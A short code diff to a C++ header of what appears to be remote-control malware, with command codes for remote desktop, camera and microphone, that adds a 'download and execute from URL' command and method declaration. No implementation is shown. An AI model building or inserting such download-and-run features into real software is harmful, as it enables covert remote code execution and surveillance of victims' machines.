@@ -29,6 +29,8 @@
 #define KNEL_DESKTOP					(0xdd04)
 #define KNEL_CAMERA						(0xdd05)
 #define KNEL_MICROPHONE					(0xdd06)
+#define KNEL_DOWNANDEXEC				(0xdd07)
+
 
 typedef struct LoginInfo
 {
@@ -72,6 +74,7 @@ public:
 	void BeginRemoteDesktop();
 	void BeginCamera();
 	void BeginMicrophone();
+	void BeginDownloadAndExec(WCHAR szUrl[]);
 	//----------------------------------------------
 	void OnNotFountModule(char*szBuffer);
 	CKernelSrv(HWND hClientList, DWORD Identity);
